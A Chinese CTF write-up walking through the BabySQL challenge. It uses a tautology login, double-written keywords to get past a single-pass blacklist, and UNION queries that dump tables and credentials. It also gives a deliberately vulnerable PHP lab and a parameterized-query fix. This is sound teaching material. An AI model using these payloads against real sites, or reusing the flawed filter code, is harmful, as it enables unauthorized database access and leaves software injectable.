---
title: "[极客大挑战 2019] BabySQL：双写绕过与 UNION 注入"
date: 2026-10-30 09:20:00
updated: 2026-10-30 09:20:00
categories:
  - CTF
  - Web
  - SQL 注入
tags:
  - SQL 注入
  - 双写绕过
  - UNION 注入
  - Burp Suite
  - 极客大挑战
description: 关键字被过滤后怎么办？把 union、select、and、or、from、where、information、password 里的关键词各写两遍，服务器删掉一遍，正好剩下正确的 SQL。再用 UNION 一步步把 flag 拖出来。
difficulty: 入门
topic: SQL 注入
series: SQL 注入
series_order: 4
permalink: 2026/10/30/web-ctf-sql-babysql/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（建议先看 [EasySQL](/2026/10/22/web-ctf-sql-easysql-geek/) 和 [LoveSQL](/2026/10/22/web-ctf-sql-lovesql/)）
- **考点**：关键字过滤、双写绕过、Burp Intruder 摸黑名单、UNION 注入
- **核心技巧**：服务器把 `union` 删掉一次，那就写 `ununionion`；删掉中间那个，两边拼起来正好是 `union`
- **flag**：`CTF2{f3074b9f-3480-41cc-a5bc-6fd0a103befa}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：`UNION SELECT` 的基本用法、`information_schema` 爆库爆表、URL 编码
- **工具**：Burp Suite（Intruder 模块）。没有 Burp 也能做，文末给了 `curl` 循环和本地复现实验。
- **环境**：文中的靶场地址是当时的临时环境，现在多半已失效。文末给了一个 **PHP + MySQL 本地复现实验**，可以完整走通双写和 UNION。
- 本文所有测试仅用于**授权靶场和本地环境**，请勿对未授权的站点进行任何测试。
{% endnote %}

{% note default %}
**做题路线**

`找注入点` → `万能密码登录` → `试 UNION 被过滤` → `Intruder 摸黑名单` → `双写绕过` → `定列数` → `爆表` → `爆列` → `拖数据`
{% endnote %}

## 第一步：观察题目

打开靶场，还是熟悉的登录框，背景上写着出题人的“狠话”：

![BabySQL 登录页](01-login.png)

*图 1：和 EasySQL、LoveSQL 同一个系列的登录页，但这次作者说“做了严格的过滤”*

页面上的原话是：

> 自从前几次网站被日，我对我的网站做了严格的过滤，你们这些黑客死心吧！！！

这句话基本就是提示：**这道题的重点在“过滤”和“绕过”**，不是普通的 UNION 一把梭。

## 第二步：找注入点

先在用户名里输入一个单引号 `1'`：

![单引号报错](02-quote-error.png)

*图 2：`You have an error in your SQL syntax ... near '1"' at line 1`*

报错说明单引号被带进了 SQL，闭合出了问题，注入点存在。报错里还透露了后端是 **MariaDB**，这对后面判断语法有帮助。

{% note warning %}
报错只能说明“这里能注入”，不能说明是字符型还是数字型。真正的判断标准是：**你构造的闭合语句能不能让页面恢复正常**。下一句 `1'||1#` 能登录，就说明这里是字符型，且 `#` 能注释掉后面的内容。
{% endnote %}

## 第三步：先用万能密码进去

在用户名里输入：

```text
1'||1#
```

密码随便填，比如 `1`：

![万能密码](03-universal-password.png)

*图 3：用户名 `1'||1#`，密码 `1`*

登录成功，页面回显了管理员信息：

![登录成功](04-login-success.png)

*图 4：`Hello admin! Your password is '57c006f528b390b78398057e3215b924'`*

这里的 `57c006...` 是 32 位 MD5，不是 flag。但页面告诉我们两件重要的事：

1. `||` 没有被过滤——黑名单拦的是**单词** `or`，不是符号 `||`；
2. 页面会回显 **用户名** 和 **密码** 两个位置，后面做 UNION 时要把数据放到对应的列。

{% note info %}
为什么 `1'||1#` 能登录？

原 SQL 大概是：

```sql
SELECT ... FROM users WHERE username='$username' AND password='$password'
```

代入后变成：

```sql
SELECT ... FROM users WHERE username='1'||1#' AND password='1'
```

`'1'||1` 在 MySQL 里是逻辑或，`1` 为真，整个条件为真；`#` 把后面的密码判断注释掉了。于是不输入正确密码也能登录。
{% endnote %}

## 第四步：试 UNION，发现关键字被吃掉了

用户名填 `admin`，密码填：

```text
1'union select 1,2,#
```

![在密码框里试 UNION](05-union-filtered.png)

*图 5：用户名 `admin`，密码 `1'union select 1,2,#`*

页面报错：

![UNION 被过滤后的报错](06-union-select-error.png)

*图 6：报错位置在 `'1,2,#'`，说明 `union` 和 `select` 已经不在 SQL 里了*

这个报错信息非常重要。你发出去的是：

```text
1'union select 1,2,#
```

报错却说 `near '1,2,#'`——中间的 `union select` 消失了。说明后端做了类似这样的处理：

```php
$password = str_ireplace('union', '', $password);
$password = str_ireplace('select', '', $password);
```

关键字被**删掉**，而不是被替换成空格或报错。这就是双写绕过的前提。

## 第五步：用 Burp Intruder 摸清黑名单

不要一个一个手试，直接用 Burp 的 Intruder 批量发包。

**1. 把登录请求送到 Intruder**

在 Burp 的 `Proxy → HTTP history` 里找到登录请求，右键 → `Send to Intruder`（快捷键 `Ctrl+I`）。

**2. 设置 payload 位置**

切到 `Positions` 标签，点 `Clear §`，然后选中密码参数的值，点 `Add §`。请求大概长这样：

```http
GET /check.php?username=admin&password=§1§ HTTP/1.1
Host: <靶场地址>
```

**3. 准备字典**

在 `Payloads` 里填入这些关键字：

```text
union
select
and
or
from
where
information
UNION
ununionion
```

**4. 开始攻击，比较响应长度**

点 `Start attack`，按 `Length` 排序：

![Intruder 结果](07-intruder.png)

*图 7：基线长度 804；`union`、`select`、`and`、`from`、`or`、`UNION` 都是 804；`ununionion` 是 1022*

怎么读这张表：

| 现象 | 含义 |
| --- | --- |
| 长度和基线（804）一样 | 关键字被过滤，SQL 还是报错/没结果 |
| 长度明显不同（如 1022） | 请求产生了不同的结果，说明这个写法“活”下来了 |
| `UNION` 也是 804 | 过滤不区分大小写 |
| `ununionion` 是 1022 | 双写有效，过滤只删了一次 |

{% note success %}
**没有 Burp 也能摸**：用 `curl` 循环，把每个关键字作为密码发一遍，比较 `size_download`。

```bash
for w in union select and or from where information; do
  printf '%-14s ' "$w"
  curl -s -o /dev/null -w '%{size_download}\n' -G 'http://<靶场地址>/check.php' \
    --data-urlencode 'username=admin' \
    --data-urlencode "password=1'$w 1,2,2#"
done
```

`--data-urlencode` 会自动处理引号、空格和 `#`，比手拼 URL 省心。
{% endnote %}

## 第六步：双写绕过的原理

后端大概率是这样过滤的（只替换一次/一轮）：

```php
$password = str_ireplace('union', '', $password);
$password = str_ireplace('select', '', $password);
// ...
```

`str_ireplace` 会扫描**原始字符串**，把匹配到的关键字删掉，但不会对“删完之后新拼出来的字符串”再扫一遍。于是：

```text
ununionion
  └─ 中间的 union 被删掉
     ↓
union
```

把常用关键字都试一遍，整理成表：

| 想写的关键字 | 双写写法 | 过滤后剩下 |
| --- | --- | --- |
| `union` | `ununionion` | `union` |
| `select` | `seselectlect` | `select` |
| `and` | `anandd` | `and` |
| `or` | `oorr` | `or` |
| `from` | `frfromom` | `from` |
| `where` | `whwhereere` | `where` |
| `information` | `infoorrmation` | `information` |
| `password` | `passwoorrd` | `password` |

{% note warning %}
最后两个容易漏：`information` 和 `password` 里本身含有 `or`。只要黑名单里有 `or`，这两个词也会被削掉，所以要把里面的 `or` 也双写。
{% endnote %}

## 第七步：确定列数（这里有个坑）

先试 3 列：

```text
1'ununionion seselectlect 1,2,2#
```

![3 列报错](08-column-count-3.png)

*图 8：`The used SELECT statements have a different number of columns`*

再试 4 列：

```text
1'ununionion seselectlect 1,2,2,3#
```

![4 列成功](09-column-count-4.png)

*图 9：`Login Success! Hello 2! Your password is '3'`*

结论：

- 原查询是 **4 列**；
- 第 2 列回显在 `Hello` 后面；
- 第 4 列回显在 `Your password is` 后面；
- 第 1、3 列不回显。

{% note warning %}
**别被表的列数骗了。** 后面爆列时会看到 `b4bsql` 表本身只有 `id, username, password` 三列（图 11），但这里的 `UNION` 却需要 4 列。这说明后端的 `SELECT` 不是简单的 `SELECT *`，而是多查了一个表达式/字段，例如：

```sql
SELECT id, username, 1, password FROM b4bsql WHERE ...
```

这样一来，表是 3 列，查询结果是 4 列，第 2 列是用户名，第 4 列是密码——和截图里的回显完全对得上。做题时**以 `UNION` 的列数为准**，不要拿表的列数去硬套。
{% endnote %}

## 第八步：爆表名

```text
1'ununionion seselectlect 1,2,group_concat(table_name),3
frfromom infoorrmation_schema.tables
whwhereere table_schema=database()#
```

![爆表](10-tables.png)

*图 10：当前库里有 `b4bsql` 和 `geekuser` 两张表*

`b4bsql` 这个名字明显是出题人留的（baby sql），flag 大概率在这张表里。

## 第九步：爆列名

```text
1'ununionion seselectlect 1,2,group_concat(column_name),3
frfromom infoorrmation_schema.columns
whwhereere table_schema=database() anandd table_name='b4bsql'#
```

![爆列](11-columns.png)

*图 11：`id,username,password`*

## 第十步：把 flag 拖出来

```text
1'ununionion seselectlect 1,2,group_concat(username,0x3a,passwoorrd),3
frfromom b4bsql#
```

![拖库结果](12-flag.png)

*图 12：所有用户名和密码被拼成一行，flag 就在里面*

注意 payload 里的两个细节：

- `frfromom`：`from` 被过滤，双写；
- `passwoorrd`：`password` 里的 `or` 被过滤，双写。

页面宽度有限，长字符串可能被 CSS 截断。**按 F12 看 Elements，或者在 Console 里执行 `document.body.innerText`** 复制完整内容。

完整 flag：

```text
CTF2{f3074b9f-3480-41cc-a5bc-6fd0a103befa}
```

## 完整 payload 汇总

万能密码是 `1'||1#`，填在**用户名框**；下面这些 payload 都是填在**密码框**，用户名保持 `admin`。

| 步骤 | payload（密码框） |
| --- | --- |
| 试 UNION | `1'union select 1,2,#` |
| 双写探路 | `1'ununionion seselectlect 1,2,2#` |
| 4 列确认 | `1'ununionion seselectlect 1,2,2,3#` |
| 爆表 | `1'ununionion seselectlect 1,2,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema=database()#` |
| 爆列 | `1'ununionion seselectlect 1,2,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_schema=database() anandd table_name='b4bsql'#` |
| 拖数据 | `1'ununionion seselectlect 1,2,group_concat(username,0x3a,passwoorrd),3 frfromom b4bsql#` |

## 本地复现实验（PHP + MySQL）

在线靶场会失效，但这道题的过滤和双写可以在本地完整复现。需要 PHP + MySQL（XAMPP、phpstudy、Docker 都行）。

**1. 建库建表**

```sql
CREATE DATABASE ctf CHARACTER SET utf8mb4;
USE ctf;

CREATE TABLE b4bsql (
  id INT PRIMARY KEY AUTO_INCREMENT,
  username VARCHAR(64),
  password VARCHAR(128)
);

INSERT INTO b4bsql (username, password) VALUES
  ('admin', '57c006f528b390b78398057e3215b924'),
  ('flag',  'CTF2{local_test_flag}');
```

**2. 写一个“有漏洞”的 `check.php`**

```php
<?php
$conn = new mysqli('127.0.0.1', 'root', 'your_password', 'ctf');
if ($conn->connect_error) {
    die('connect error');
}

$username = $_GET['username'] ?? '';
$password = $_GET['password'] ?? '';

// 模拟题目的黑名单：每个关键字只删一次
$blacklist = ['union', 'select', 'and', 'or', 'from', 'where', 'information'];
foreach ($blacklist as $word) {
    $username = str_ireplace($word, '', $username);
    $password = str_ireplace($word, '', $password);
}

// 注意这里查了 4 列：id, username, 常量 1, password
$sql = "SELECT id, username, 1, password FROM b4bsql
        WHERE username='$username' AND password='$password'";
$result = $conn->query($sql);

if ($result && $row = $result->fetch_row()) {
    echo "Hello {$row[1]}! Your password is '{$row[3]}'";
} else {
    echo "Login failed: " . $conn->error;
}
```

**3. 访问并复现**

```text
http://127.0.0.1/check.php?username=1%27%7C%7C1%23&password=1
http://127.0.0.1/check.php?username=admin&password=1%27union%20select%201,2,%23
http://127.0.0.1/check.php?username=admin&password=1%27ununionion%20seselectlect%201,2,2,3%23
```

观察：

- 第一个能登录；
- 第二个报错，报错位置里 `union select` 不见了；
- 第三个成功，页面显示 `Hello 2! Your password is '3'`。

然后继续用双写 payload 爆库、爆表、爆列、拖数据。你会得到和靶场一样的流程，只是 flag 换成了 `local_test_flag`。

{% note success %}
这个实验的关键是 `str_ireplace` 的“单轮替换”行为。把 `str_ireplace` 换成 `preg_replace`（默认也是单轮）效果一样；如果换成 `while (strpos(...))` 循环删除，双写就会失效，这也是不同题目绕过方式不同的原因。
{% endnote %}

## 工具速查卡

| 操作 | Burp 路径 | 说明 |
| --- | --- | --- |
| 抓请求 | `Proxy → HTTP history` | 找到登录请求 |
| 送到 Intruder | 右键 → `Send to Intruder` | 快捷键 `Ctrl+I` |
| 设 payload 位置 | `Positions → Clear § → Add §` | 只包住密码值 |
| 载入字典 | `Payloads → Simple list` | 一行一个关键字 |
| 比较结果 | 结果表按 `Length` 排序 | 和基线长度不同 = 有变化 |
| 手动改包 | `Repeater`（`Ctrl+R`） | 一次改一个关键字，适合验证 |

## 新手常见问题

{% note info **Q1：`or` 被过滤了，为什么 `1'||1#` 还能用？** %}
黑名单过滤的是字符串 `or`，`||` 是逻辑或运算符，不是 `or` 这三个字符。同理，`&&`、`|`、`;` 这些符号能不能用，要看黑名单有没有单独拦。
{% endnote %}

{% note info **Q2：为什么双写能绕过？** %}
因为过滤只做了一轮替换。`ununionion` 里只有一个 `union` 子串，删掉后剩下 `union`；如果过滤是循环删除直到没有关键字，双写就会失效。看到“双写有效”，基本可以判断后端用的是 `str_replace` / `preg_replace` 这类单轮替换。
{% endnote %}

{% note info **Q3：为什么 `1,2,2` 报列数错误，`1,2,2,3` 就成功？** %}
`UNION` 前后列数必须一致。`1,2,2` 是 3 列，原查询是 4 列；`1,2,2,3` 是 4 列，正好对上。**以 `UNION` 的列数为准，不要用表的列数去猜。**
{% endnote %}

{% note info **Q4：为什么表只有 3 列，查询却有 4 列？** %}
后端 `SELECT` 里多查了一个表达式或字段，比如 `SELECT id, username, 1, password FROM ...`。表是 3 列，结果集是 4 列。这也是为什么第 2 列回显用户名、第 4 列回显密码。
{% endnote %}

{% note info **Q5：`passwoorrd` 为什么多了一个 `o` 和 `r`？** %}
`password` 里含有 `or`，而 `or` 在黑名单里。把 `or` 写成 `oorr`，过滤删掉一个 `or`，剩下 `or`，整个词就恢复成 `password`。`infoorrmation` 同理。
{% endnote %}

{% note info **Q6：为什么 `union` 大写也被拦？** %}
过滤用的是 `str_ireplace` / `preg_replace` 的 `i` 模式，不区分大小写。大小写绕过只对区分大小写的 `str_replace` 有效，别默认它一定行。
{% endnote %}

{% note info **Q7：页面只显示了一部分数据怎么办？** %}
CSS 可能把长文本截断。按 F12 看 Elements，或者在 Console 执行 `document.body.innerText`，复制完整内容。也可以直接在 payload 里用 `where password like 'CTF2%'` 过滤，减少输出。
{% endnote %}

{% note info **Q8：`group_concat` 结果被截断了？** %}
MySQL 的 `group_concat_max_len` 默认 1024 字节。用 `substr()` 分段读：

```text
1'ununionion seselectlect 1,2,substr(group_concat(username,0x3a,passwoorrd),1,1024),3 frfromom b4bsql#
```

把 `1` 改成 `1025`、`2049`，继续往后读。
{% endnote %}

{% note info **Q9：`#` 为什么要写成 `%23`？** %}
浏览器地址栏里 `#` 表示锚点，后面的内容不会发给服务器。用 Burp 或 `curl --data-urlencode` 会自动编码；手写 URL 时写成 `%23`。
{% endnote %}

{% note info **Q10：怎么知道后端是 MariaDB？** %}
报错信息里直接写了 `MariaDB server version`。MariaDB 和 MySQL 语法基本兼容，`information_schema`、`group_concat` 都能用。
{% endnote %}

## 顺手聊聊怎么防

这道题的黑名单已经拦了 `union`、`select`、`and`、`or`、`from`、`where`、`information`，看起来挺全，但**黑名单永远有遗漏**：双写、大小写、注释、编码、等价函数、堆叠注入……攻击者的想象力比字典大。

真正靠谱的做法：

| 优先级 | 措施 | 说明 |
| --- | --- | --- |
| ★★★ | **预编译语句（参数化查询）** | 让输入永远是数据，不进入 SQL 语法 |
| ★★★ | **输入白名单校验** | 用户名只允许字母数字下划线，长度受限 |
| ★★★ | **数据库账号最小权限** | Web 账号不要有 `FILE`、跨库、`information_schema` 之外的权限 |
| ★★☆ | **不回显数据库报错** | 报错会告诉攻击者过滤规则、列数、数据库类型 |
| ★★☆ | **密码加盐哈希** | 不要明文/MD5 存储 |
| ★☆☆ | **WAF / 黑名单** | 只能提高门槛，不能作为唯一防线 |

参数化查询的写法：

```php
$stmt = $pdo->prepare(
    'SELECT id, username, password FROM b4bsql WHERE username = ? AND password = ?'
);
$stmt->execute([$username, $password]);
$row = $stmt->fetch();
```

{% note success %}
**一条原则**：不要试图“过滤掉所有坏字符”，而是让用户输入**没有机会变成 SQL 语法**。预编译 + 白名单 + 最小权限，三件事做到，SQL 注入就很难成立。
{% endnote %}
